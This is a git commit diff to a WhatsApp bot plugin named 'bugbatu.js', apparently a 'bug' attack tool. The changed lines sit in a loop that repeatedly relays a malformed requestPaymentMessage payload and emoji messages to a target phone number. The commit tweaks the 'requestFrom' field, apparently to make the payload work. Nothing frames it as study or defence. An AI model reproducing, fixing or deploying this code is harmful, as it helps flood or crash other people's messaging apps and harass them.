f971efd342861906cc07c2e8c77514807041af27
Dede Kurniawan <dede.klender@gmail.com>
2023-10-11 14:39:14 +0700

    update bugbatu.js

--- plugins/bugbatu.js
+++ plugins/bugbatu.js
@@ -26,7 +26,7 @@ for (let i = 0; i < jumlah; i++) {
   
 let gmbr = await fetch('https://genix.eu.org/akebi.jpg')
     
-conn.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: '🗿', currencyCodeIso4217: 'IDR', requestFrom: '@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: global.ppmika }}}}, {})
+conn.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: '🗿', currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: global.ppmika }}}}, {})
 
 conn.sendMessage(num, { text: '🗿'}, { quoted: dann })
 }
